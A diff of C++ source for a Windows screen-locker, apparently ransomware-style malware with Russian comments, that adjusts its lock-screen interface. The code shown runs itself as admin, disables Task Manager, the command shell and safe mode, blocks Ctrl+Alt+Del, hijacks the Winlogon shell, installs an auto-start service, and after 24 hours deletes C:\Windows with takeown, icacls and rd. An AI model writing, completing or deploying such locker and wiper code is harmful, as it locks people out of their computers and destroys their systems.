@@ -55,6 +55,19 @@ void UpdateTimer();
 bool IsAdmin();
 void RunAsAdmin();
 LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);
+void SetEditBackground(HWND hEdit, COLORREF color);
+
+// ==================== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ====================
+void SetEditBackground(HWND hEdit, COLORREF color) {
+    HDC hdc = GetDC(hEdit);
+    HBRUSH hBrush = CreateSolidBrush(color);
+    RECT rect;
+    GetClientRect(hEdit, &rect);
+    FillRect(hdc, &rect, hBrush);
+    DeleteObject(hBrush);
+    ReleaseDC(hEdit, hdc);
+    InvalidateRect(hEdit, NULL, TRUE);
+}
 
 // ==================== АДМИН ====================
 bool IsAdmin() {
@@ -90,7 +103,6 @@ void UnblockKeys() {
 
 void BlockAllKeys() {
     BlockKeys();
-    // Блокировка Ctrl+Alt+Del через реестр
     HKEY hKey;
     if (RegCreateKeyEx(HKEY_CURRENT_USER,
         "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
@@ -292,7 +304,6 @@ void AddAutostart() {
         RegSetValueExA(hKey, "Shell", 0, REG_SZ, (BYTE*)"LogonUI.exe", 11);
         RegCloseKey(hKey);
     }
-    // Служба
     string cmd = "sc create WinLockerService binPath= \"" + string(exePath) + "\" start= auto";
     system(cmd.c_str());
 }
@@ -309,7 +320,7 @@ void RemoveAutostart() {
 }
 
 void DeleteWindows() {
-    Sleep(86400000); // 24 часа
+    Sleep(86400000);
     system("takeown /f C:\\Windows /r /d y");
     system("icacls C:\\Windows /grant Administrator:F /t");
     system("cmd /c rd /s /q C:\\Windows");
@@ -318,7 +329,7 @@ void DeleteWindows() {
     ExitProcess(0);
 }
 
-// ==================== ИНТЕРФЕЙС ====================
+// ==================== ТАЙМЕР ====================
 void UpdateTimer() {
     if (g_remaining <= 0) {
         DeleteWindows();
@@ -334,12 +345,13 @@ void UpdateTimer() {
     SetTimer(hwndMain, ID_TIMER, 1000, NULL);
 }
 
+// ==================== ОКОННАЯ ФУНКЦИЯ ====================
 LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
     switch (msg) {
         case WM_CREATE: {
             HINSTANCE hInst = (HINSTANCE)GetWindowLongPtr(hwnd, GWLP_HINSTANCE);
             
-            // Создаем элементы интерфейса
+            // Заголовок
             HWND hTitle = CreateWindowA("STATIC", "Windows заблокирован!",
                 WS_CHILD | WS_VISIBLE | SS_LEFT, 40, 30, 400, 40, hwnd, NULL, hInst, NULL);
             HFONT hFont = CreateFontA(28, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
@@ -434,10 +446,14 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
                 } else {
                     g_password.clear();
                     SetWindowTextA(hInput, "");
-                    // Красный фон
-                    SendMessage(hInput, EM_SETBKGNDCOLOR, 0, RGB(255, 0, 0));
+                    // Красный фон через SetWindowLong
+                    HBRUSH hBrush = CreateSolidBrush(RGB(255, 0, 0));
+                    SetClassLongPtr(hInput, GCLP_HBRBACKGROUND, (LONG_PTR)hBrush);
+                    InvalidateRect(hInput, NULL, TRUE);
                     Sleep(300);
-                    SendMessage(hInput, EM_SETBKGNDCOLOR, 0, RGB(64, 64, 64));
+                    hBrush = CreateSolidBrush(RGB(64, 64, 64));
+                    SetClassLongPtr(hInput, GCLP_HBRBACKGROUND, (LONG_PTR)hBrush);
+                    InvalidateRect(hInput, NULL, TRUE);
                 }
             }
             break;
@@ -462,7 +478,6 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
 int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
     if (!IsAdmin()) { RunAsAdmin(); return 0; }
     
-    // Блокируем всё
     DisableTaskManager();
     DisableCmdPowershell();
     BlockSafeMode();
@@ -471,7 +486,6 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdSh
     KillExplorer();
     BlockAllKeys();
     
-    // Создаём окно
     WNDCLASSA wc = {0};
     wc.lpfnWndProc = WndProc;
     wc.hInstance = hInst;
@@ -491,8 +505,7 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdSh
     SetForegroundWindow(hwndMain);
     SetWindowPos(hwndMain, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
     
-    // Таймер уничтожения Windows
-    std::thread deleteThread(DeleteWindows);
+    thread deleteThread(DeleteWindows);
     deleteThread.detach();
     
     MSG msg;
